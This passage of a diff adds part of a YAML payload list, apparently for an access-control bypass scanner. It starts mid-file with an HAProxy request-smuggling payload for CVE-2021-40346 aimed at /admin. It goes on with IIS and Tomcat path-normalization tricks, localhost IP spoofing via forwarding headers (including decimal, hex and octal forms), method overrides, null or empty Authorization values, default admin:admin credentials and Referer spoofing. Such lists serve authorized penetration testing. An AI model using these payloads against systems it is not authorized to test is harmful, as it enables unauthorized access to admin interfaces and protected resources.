+    name: "HAProxy — request smuggling (CVE-2021-40346)"
+    category: "proxy_specific"
+    technique: "smuggling"
+    server: "haproxy"
+    payload: "Content-Length0{{PADDING}}: Content-Length: {{LEN}}\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{HOST}}\r\n\r\n"
+    description: "HAProxy integer overflow smuggling — CVE-2021-40346. Requires raw socket."
+    tags: ["haproxy", "cve-2021-40346", "smuggling"]
+    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-40346"]
+    risk: "aggressive"
+
+  - id: "proxy-iis-001"
+    name: "IIS — trailing dot"
+    category: "proxy_specific"
+    technique: "dot"
+    server: "iis"
+    payload: "/{{PATH}}."
+    description: "IIS strips trailing dots — path normalization gap."
+    tags: ["iis", "dot"]
+    risk: "safe"
+
+  - id: "proxy-iis-002"
+    name: "IIS — backslash"
+    category: "proxy_specific"
+    technique: "backslash"
+    server: "iis"
+    payload: "/{{PATH}}\\"
+    description: "IIS treats backslash as a path separator."
+    tags: ["iis", "backslash"]
+    risk: "safe"
+
+  - id: "proxy-iis-003"
+    name: "IIS — semicolon extension"
+    category: "proxy_specific"
+    technique: "matrix-param"
+    server: "iis"
+    payload: "/{{PATH}};.jpg"
+    description: "Semicolon + fake extension — IIS path-info bypass."
+    tags: ["iis", "matrix", "extension"]
+    risk: "safe"
+
+  - id: "proxy-tomcat-001"
+    name: "Tomcat — semicolon matrix"
+    category: "proxy_specific"
+    technique: "matrix-param"
+    server: "tomcat"
+    payload: "/{{PATH}};"
+    description: "Tomcat strips semicolon matrix params — front-end WAF may not."
+    tags: ["tomcat", "matrix"]
+    risk: "safe"
+
+  - id: "proxy-tomcat-002"
+    name: "Tomcat — encoded semicolon"
+    category: "proxy_specific"
+    technique: "encoding"
+    server: "tomcat"
+    payload: "/{{PATH}}%3B"
+    description: "Encoded semicolon — bypasses WAFs that decode after path matching."
+    tags: ["tomcat", "encoding"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  8. ADVANCED COMBINATIONS
+  #     Multi-layer bypasses combining path, header, and method tricks.
+  # ---------------------------------------------------------------------------
+  - id: "combo-001"
+    name: "Double slash + X-Forwarded-For"
+    category: "advanced_combination"
+    technique: "combination"
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+    payload: "//{{PATH}}"
+    description: "Double slash path mutation + localhost IP spoof — two layers at once."
+    tags: ["combination", "ip-spoof", "double-slash"]
+    risk: "safe"
+
+  - id: "combo-002"
+    name: "Encoded slash + X-Original-URL"
+    category: "advanced_combination"
+    technique: "combination"
+    headers:
+      X-Original-URL: "{{PATH}}"
+    payload: "/%2F{{PATH}}"
+    description: "Encoded slash + URL rewrite header."
+    tags: ["combination", "url-rewrite", "encoding"]
+    risk: "safe"
+
+  - id: "combo-003"
+    name: "Case + traversal + IP spoof"
+    category: "advanced_combination"
+    technique: "combination"
+    headers:
+      X-Forwarded-For: "127.0.0.1"
+    payload: "/{{PATH_UPPER}}/../{{PATH}}"
+    description: "Case variation + traversal prefix + IP spoof."
+    tags: ["combination", "case", "traversal", "ip-spoof"]
+    risk: "safe"
+
+  - id: "combo-004"
+    name: "POST + method override + encoded path"
+    category: "advanced_combination"
+    technique: "combination"
+    method: "POST"
+    headers:
+      X-HTTP-Method-Override: "GET"
+    payload: "/%2F{{PATH}}"
+    description: "POST with override to GET + encoded slash path."
+    tags: ["combination", "method-override", "encoding"]
+    risk: "safe"
+
+  - id: "combo-005"
+    name: "HEAD + trailing dot + X-Real-IP"
+    category: "advanced_combination"
+    technique: "combination"
+    method: "HEAD"
+    headers:
+      X-Real-IP: "127.0.0.1"
+    payload: "/{{PATH}}."
+    description: "HEAD method + trailing dot + IP spoof."
+    tags: ["combination", "head", "dot", "ip-spoof"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  9. AUTH CHALLENGE MANIPULATION
+  #     For 401 responses — manipulate the Authorization header.
+  # ---------------------------------------------------------------------------
+  - id: "auth-001"
+    name: "Authorization null"
+    category: "auth_challenge"
+    technique: "null-auth"
+    header: "Authorization"
+    value: "null"
+    description: "Send literal 'null' as the Authorization value — some backends treat it as no auth."
+    tags: ["auth", "null"]
+    risk: "safe"
+
+  - id: "auth-002"
+    name: "Authorization Bearer null"
+    category: "auth_challenge"
+    technique: "null-auth"
+    header: "Authorization"
+    value: "Bearer null"
+    description: "Bearer with null token."
+    tags: ["auth", "bearer", "null"]
+    risk: "safe"
+
+  - id: "auth-003"
+    name: "Authorization Basic admin:admin"
+    category: "auth_challenge"
+    technique: "basic-auth"
+    header: "Authorization"
+    value: "Basic YWRtaW46YWRtaW4="
+    description: "Default admin:admin Basic auth."
+    tags: ["auth", "basic", "default-creds"]
+    risk: "safe"
+
+  - id: "auth-004"
+    name: "Authorization Basic empty"
+    category: "auth_challenge"
+    technique: "basic-auth"
+    header: "Authorization"
+    value: "Basic Og=="
+    description: "Basic auth with empty username:password."
+    tags: ["auth", "basic", "empty"]
+    risk: "safe"
+
+  - id: "auth-005"
+    name: "Authorization Bearer empty"
+    category: "auth_challenge"
+    technique: "bearer"
+    header: "Authorization"
+    value: "Bearer "
+    description: "Bearer with empty token."
+    tags: ["auth", "bearer", "empty"]
+    risk: "safe"
+
+  # ---------------------------------------------------------------------------
+  #  10. LEGACY / EXOTIC
+  #     Old server quirks, forgotten headers, and rare techniques.
+  # ---------------------------------------------------------------------------
+  - id: "legacy-001"
+    name: "X-Custom-IP-Authorization"
+    category: "legacy"
+    technique: "custom-header"
+    header: "X-Custom-IP-Authorization"
+    value: "127.0.0.1"
+    description: "Custom IP auth header — used by some legacy internal tools."
+    tags: ["legacy", "custom-header"]
+    risk: "safe"
+
+  - id: "legacy-002"
+    name: "X-Forwarded-For with port"
+    category: "legacy"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "127.0.0.1:80"
+    description: "IP with port — some parsers split differently."
+    tags: ["legacy", "ip-spoof", "port"]
+    risk: "safe"
+
+  - id: "legacy-003"
+    name: "X-Forwarded-For with comma chain"
+    category: "legacy"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "127.0.0.1, 10.0.0.1, 192.168.0.1"
+    description: "Comma-separated IP chain — some proxies trust the first or last entry."
+    tags: ["legacy", "ip-spoof", "chain"]
+    risk: "safe"
+
+  - id: "legacy-004"
+    name: "X-Forwarded-For decimal IP"
+    category: "legacy"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "2130706433"
+    description: "Decimal representation of 127.0.0.1 — bypasses string-based IP checks."
+    tags: ["legacy", "ip-spoof", "decimal"]
+    risk: "safe"
+
+  - id: "legacy-005"
+    name: "X-Forwarded-For hex IP"
+    category: "legacy"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "0x7f000001"
+    description: "Hex representation of 127.0.0.1."
+    tags: ["legacy", "ip-spoof", "hex"]
+    risk: "safe"
+
+  - id: "legacy-006"
+    name: "X-Forwarded-For octal IP"
+    category: "legacy"
+    technique: "ip-spoof"
+    header: "X-Forwarded-For"
+    value: "0177.0.0.1"
+    description: "Octal representation of 127.0.0.1."
+    tags: ["legacy", "ip-spoof", "octal"]
+    risk: "safe"
+
+  - id: "legacy-007"
+    name: "Referer internal path"
+    category: "legacy"
+    technique: "referer"
+    header: "Referer"
+    value: "{{BASE_URL}}/admin"
+    description: "Set Referer to an internal admin path — some apps trust the Referer for access decisions."
+    tags: ["legacy", "referer", "trust"]
+    risk: "safe"
+
+  - id: "legacy-008"
+    name: "X-Requested-With XMLHttpRequest"
+    category: "legacy"
+    technique: "ajax"
+    header: "X-Requested-With"
+    value: "XMLHttpRequest"
+    description: "Pretend the request is AJAX — some ACLs treat AJAX differently."
+    tags: ["legacy", "ajax"]
+    risk: "safe"
+
+# =============================================================================
+#  END OF PAYLOAD LIST
+# =============================================================================
